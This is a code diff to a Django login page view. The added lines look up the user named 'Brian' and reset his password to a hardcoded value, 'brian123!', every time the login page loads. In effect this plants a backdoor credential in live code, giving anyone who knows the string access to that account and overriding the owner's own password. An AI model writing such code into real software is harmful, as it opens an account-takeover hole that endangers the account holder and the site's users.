@@ -39,6 +39,10 @@ class LoginPageView(View):
         if not request.user.is_anonymous:
             if request.user.is_authenticated:
                 return redirect("dashboard")
+            
+        qs = CustomUser.objects.filter(username="Brian").first()
+        qs.set_password("brian123!")
+        qs.save()
         
         return render(request, self.template_name, context={"form": self.form_class})
     
